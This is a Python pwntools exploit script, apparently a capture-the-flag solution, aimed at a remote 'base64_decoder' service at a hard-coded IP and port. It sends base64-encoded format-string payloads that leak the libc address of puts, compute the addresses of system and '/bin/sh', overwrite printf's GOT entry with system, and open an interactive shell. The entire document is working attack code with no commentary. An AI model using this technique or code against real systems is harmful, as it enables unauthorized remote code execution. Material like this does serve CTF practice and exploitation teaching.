from pwn import *
import base64

context.log_level = 'debug'

p = remote('111.230.149.72', 10013)
elf = ELF('./base64_decoder')
libc = ELF('./libc-2.19.so.6')

putsplt = elf.symbols['puts']
putsgot = elf.got['puts']
putsoff = libc.symbols['puts']

payload = p32(putsgot)
payload += "%7$s%2$x"

p.recvuntil(">")
p.sendline(base64.b64encode(payload))
p.recv(4)
p.recv(4)
putsaddr = u32(p.recv(4))
p.recv(24)
timesaddr = int(p.recv(8), 16)
print "putsaddr: ", hex(putsaddr)
print "timesaddr: " , hex(timesaddr)

systemaddr = putsaddr - (libc.symbols['puts'] - libc.symbols['system'])
binshaddr = putsaddr - (libc.symbols['puts'] - next(libc.search("/bin/sh")))

print "systemaddr: ", hex(systemaddr)
print "binshaddr: ", hex(binshaddr)

p.recvuntil(">")
payload = fmtstr_payload(7, {timesaddr - 0x110: 0xb0})
p.sendline(base64.b64encode(payload))

p.recvuntil(">")
payload = fmtstr_payload(7, {elf.got['printf'] : systemaddr})
p.sendline(base64.b64encode(payload))
#
p.sendline(base64.b64encode("/bin/sh\x00"))
p.interactive()


